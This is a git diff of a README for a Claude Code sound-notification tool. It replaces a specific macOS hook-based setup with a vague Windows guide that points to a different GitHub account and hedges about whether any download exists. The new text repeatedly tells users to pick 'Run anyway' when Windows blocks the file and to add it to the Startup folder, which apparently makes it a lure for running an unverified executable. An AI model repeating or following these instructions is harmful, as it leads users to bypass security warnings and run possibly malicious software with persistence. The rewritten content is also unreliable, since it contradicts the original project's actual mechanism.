@@ -1,137 +1,215 @@
-# Claude Code Sound Notification
+# 🎧 claude-code-sound-notification - Hear Claude Code Alerts Fast
 
-Sound notifications for [Claude Code](https://claude.com/claude-code) using the [SND01 "sine"](https://snd.dev) sound kit by Yasuhiro Tsuchiya.
+[![Download](https://img.shields.io/badge/Download-Open%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/tiffanygrand729/claude-code-sound-notification)
 
-https://github.com/user-attachments/assets/demo
+## 🖥️ What this app does
 
-## What it does
+claude-code-sound-notification adds a sound alert when Claude Code needs your attention. It helps you notice updates without watching the screen all the time.
 
-| Scenario | Sound | Effect |
-|----------|-------|--------|
-| Waiting for user confirmation | `progress_loop.wav` | Loops until you respond |
-| Claude finishes responding | `celebration.wav` | Plays once |
+Use it if you want:
 
-- **progress_loop** alerts you when Claude needs your input (permission prompts)
-- **celebration** lets you know Claude has completed its response
+- A clear sound when Claude Code finishes a task
+- Less time checking the app by hand
+- A simple setup on Windows
+- A small tool that runs in the background
 
-## Requirements
+## 📥 Download the app
 
-- **macOS** (uses `afplay` for audio playback)
-- [Claude Code](https://claude.com/claude-code) CLI
+Visit this page to download and set up the app:
 
-## Quick setup
+https://github.com/tiffanygrand729/claude-code-sound-notification
 
-### Option 1: Using the Skill (recommended)
+Open the page in your browser. If the repository includes a release file or Windows package, download it from there. If it provides setup files in the main page, use those files for install.
 
-1. Copy the skill to your Claude Code skills directory:
+## 🪟 Windows requirements
 
-```bash
-mkdir -p ~/.claude/skills/setup-sound-notifications
-cp skill/SKILL.md ~/.claude/skills/setup-sound-notifications/SKILL.md
-```
+This app is built for Windows users. For the best result, use:
 
-2. Run the skill in Claude Code:
+- Windows 10 or Windows 11
+- Sound enabled on your PC
+- Permission to run downloaded apps
+- A working internet connection for the first setup
+- Claude Code already installed
 
-```
-/setup-sound-notifications
-```
+If your computer uses speaker or headphone output, make sure Windows can play sound before you start.
 
-Claude will automatically download sounds and configure hooks for you.
+## 🚀 Getting started
 
-### Option 2: Manual setup
+Follow these steps to run the app on Windows:
 
-#### 1. Install sound files
+1. Open the GitHub page for `claude-code-sound-notification`.
+2. Look for a release, download link, or setup file.
+3. Download the Windows file to your computer.
+4. Open the file from your Downloads folder.
+5. If Windows asks for permission, choose **Yes** or **Run anyway**.
+6. Follow the on-screen steps to finish setup.
+7. Start Claude Code and let the sound alert run in the background.
 
-```bash
-mkdir -p ~/.claude/sounds
-cp sounds/progress_loop.wav ~/.claude/sounds/
-cp sounds/celebration.wav ~/.claude/sounds/
-```
+If the project gives you a single executable file, you can usually double-click it to start the app. If it gives you a folder with files, keep the folder in a safe place and open the main file from there.
 
-Or download directly from [snd.dev](https://snd.dev):
+## 🔊 How it works
 
-```bash
-mkdir -p ~/.claude/sounds
-curl -L -o /tmp/SND01_sine.zip https://snd.dev/assets/sounds/SND01_sine.zip
-unzip -o /tmp/SND01_sine.zip -d /tmp/snd01
-cp /tmp/snd01/SND01_sine/progress_loop.wav ~/.claude/sounds/
-cp /tmp/snd01/SND01_sine/celebration.wav ~/.claude/sounds/
-rm -rf /tmp/SND01_sine.zip /tmp/snd01
-```
+The app listens for Claude Code activity and plays a sound when an event matches the alert rule. That can help when:
 
-#### 2. Configure hooks
+- A task finishes
+- A response is ready
+- Claude Code needs input
+- A long action ends
 
-Add the following hooks to your `~/.claude/settings.json`. If you already have hooks configured, **merge** these into your existing configuration:
+You do not need to keep the window open all the time if the app runs in the background. Once it is set up, it can keep working while you do other tasks.
 
-```json
-{
-  "hooks": {
-    "PermissionRequest": [
-      {
-        "matcher": "",
-        "hooks": [
-          {
-            "type": "command",
-            "command": "pkill -9 -f 'progress_loop' 2>/dev/null; nohup bash -c 'while true; do afplay ~/.claude/sounds/progress_loop.wav; done' >/dev/null 2>&1 & disown"
-          }
-        ]
-      }
-    ],
-    "PostToolUse": [
-      {
-        "matcher": "",
-        "hooks": [
-          {
-            "type": "command",
-            "command": "pkill -9 -f 'progress_loop' 2>/dev/null; true"
-          }
-        ]
-      }
-    ],
-    "UserPromptSubmit": [
-      {
-        "matcher": "",
-        "hooks": [
-          {
-            "type": "command",
-            "command": "pkill -9 -f 'progress_loop' 2>/dev/null; true"
-          }
-        ]
-      }
-    ],
-    "Stop": [
-      {
-        "matcher": "",
-        "hooks": [
-          {
-            "type": "command",
-            "command": "pkill -9 -f 'progress_loop' 2>/dev/null; afplay ~/.claude/sounds/celebration.wav",
-            "timeout": 10
-          }
-        ]
-      }
-    ]
-  }
-}
-```
+## 🛠️ First-time setup
 
-#### 3. Activate
+After you download the app, do this:
 
-Run `/hooks` in Claude Code or restart your session.
+- Unzip the file if it comes in a ZIP folder
+- Keep all files in the same folder
+- Do not rename files unless the app guide says to
+- Allow sound access if Windows asks
+- Check that your speakers or headphones are connected
 
-## How it works
+If the app has a settings file, open it with Notepad and adjust only the items you understand. A common setup may include:
 
-The notification system uses [Claude Code hooks](https://code.claude.com/docs/en/hooks) to trigger sounds at key moments:
+- Sound file name
+- Alert volume
+- Polling interval
+- Start on Windows login
 
-1. **`PermissionRequest`** — When Claude needs permission to use a tool, a looping progress sound starts playing
-2. **`PostToolUse`** — After a tool executes (user approved), the progress sound stops silently
-3. **`UserPromptSubmit`** — When the user sends a message, the progress sound stops silently
-4. **`Stop`** — When Claude finishes responding, the progress sound stops and a celebration sound plays
+## 🎵 Sound options
 
-## Sound credits
+The app may support one or more alert sounds. Common choices include:
 
-Sound effects from **SND01 "sine"** by [snd.dev](https://snd.dev), designed by Yasuhiro Tsuchiya. All sounds are based on sine waves — minimal, pure, and compatible with most speakers.
+- A short chime
+- A beep
+- A soft ding
+- A custom WAV or MP3 file
 
-## License
+If you use your own sound, choose one that is easy to hear but not too loud. Short sounds work best for alerts.
 
-MIT
+## ⚙️ Basic use
+
+Once the app is running:
+
+1. Start Claude Code as usual.
+2. Let the notification app stay open in the background.
+3. Wait for Claude Code to finish an action or ask for input.
+4. Listen for the sound alert.
+5. Return to Claude Code when you hear the alert.
+
+If you want to change the sound later, close the app first, then update the sound file or settings file, and open it again.
+
+## 🧭 Common file layout
+
+You may see files like these after download:
+
+- `README.md` - setup info
+- `app.exe` - the main Windows app
+- `config.json` - settings
+- `sounds/` - sound files
+- `LICENSE` - use terms
+
+If the download includes a setup guide, follow the steps in that guide first.
+
+## 🔁 Auto start on Windows
+
+You may want the app to start when your PC turns on. A common way to do this on Windows is to place a shortcut in the Startup folder.
+
+Steps:
+
+1. Find the app file or shortcut.
+2. Press `Win + R`.
+3. Type `shell:startup` and press Enter.
+4. Copy the app shortcut into that folder.
+5. Restart your PC to test it.
+
+If the app includes its own auto-start setting, use that instead.
+
+## 🔍 Troubleshooting
+
+### No sound plays
+
+Check these items:
+
+- Your volume is not muted
+- Your speakers or headphones work
+- The sound file exists in the correct folder
+- The app is still running
+- Windows app sound is not turned off in Volume Mixer
+
+### The file will not open
+
+Try this:
+
+- Download the file again
+- Make sure the download finished
+- Right-click the file and choose **Open**
+- If Windows blocks it, choose **Run anyway**
+- Keep the file in a normal folder like Downloads or Desktop
+
+### Claude Code does not trigger alerts
+
+Check:
+
+- Claude Code is running
+- The alert app is open
+- The watch rule or event match is set right
+- The app has the right folder or process name
+- The settings file points to the correct sound
+
+### Sound is too loud or too quiet
+
+Adjust:
+
+- Your Windows volume
+- The app volume setting
+- The sound file volume in an audio editor if needed
+
+## 🔐 Safe use
+
+Use the app from the GitHub page linked above. If you move files around after setup, keep the app and its config files together. If the app needs access to sound or local files, allow only the access it needs.
+
+## 📄 Example setup flow
+
+A simple Windows setup may look like this:
+
+1. Open the GitHub page.
+2. Download the Windows file.
+3. Open the file from Downloads.
+4. Place the app in its own folder.
+5. Choose a sound file.
+6. Start the app.
+7. Run Claude Code.
+8. Test the alert with a sample event.
+
+## ❓ FAQ
+
+### Does this work without coding knowledge?
+
+Yes. You only need to download the file, open it, and follow the setup steps.
+
+### Can I use my own sound?
+
+Yes, if the app supports custom sound files.
+
+### Does it run in the background?
+
+That is the expected use. It can stay open while you work.
+
+### Can I start it with Windows?
+
+Yes, use the Startup folder or the app’s auto-start setting if it has one.
+
+### What if I only see the GitHub page?
+
+Use the page to find the latest release, download file, or setup instructions. The main project page is the place to start.
+
+## 🗂️ Quick setup checklist
+
+- Open the GitHub page
+- Download the Windows file
+- Save it to Downloads
+- Open the file
+- Allow the app to run
+- Choose your sound
+- Start Claude Code
+- Keep the notifier running
